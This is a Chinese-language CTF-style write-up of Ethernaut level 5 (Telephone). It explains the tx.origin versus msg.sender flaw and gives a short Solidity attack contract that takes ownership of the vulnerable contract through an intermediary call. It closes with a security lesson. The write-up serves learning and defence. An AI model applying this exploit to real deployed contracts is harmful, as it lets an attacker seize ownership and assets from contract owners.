---
title: Ethernaut 闯关笔记 第5关 Telephone
date: 2023-12-07 12:20:52
tags:
---

# 原始代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

目标：成为合约 owner 。

# 攻击思路

本关考察 `tx.origin` 和 `msg.sender` 的区别。

* `tx.origin` ：本次交易的最早发起人，只可能是一个钱包
* `msg.sender` ：本次合约调用的直接行为主体，可能是钱包也可能是另一个合约

因此，只需要另外部署一个合约，让这个合约调用 `changeOwner()` 即可符合条件。

# 攻击代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract TelephoneHack{
    address constant TARGET = 0x6e4F3a2689069C568E51db94E76D0A84f00aa20f;
    address constant MY = 0x15AfABaA426334636008Bc15805760716E8b5c5E;

    function run() public {
        Telephone telephone = Telephone(TARGET);
        telephone.changeOwner(MY);
    }
}
```

# 安全启示

务必区分清楚 `tx.origin` 和 `msg.sender` 。

如果使用不当，可能导致 `owner` 指向一个合约地址。如果指向的合约没有实现该有的功能，原始合约的控制权就会丢失。
